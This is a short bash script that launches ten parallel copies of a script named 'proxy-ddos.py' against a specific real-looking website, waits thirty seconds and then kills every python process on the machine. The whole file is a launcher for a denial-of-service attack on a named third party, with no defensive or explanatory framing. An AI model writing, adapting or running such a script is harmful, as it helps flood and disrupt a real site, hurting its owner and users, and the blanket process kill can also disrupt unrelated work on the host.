#!/bin/bash

for i in {1..10};
do
    python proxy-ddos.py http://yanhaijing.com/ &
    echo $i
done

sleep 30

kill `pgrep python`
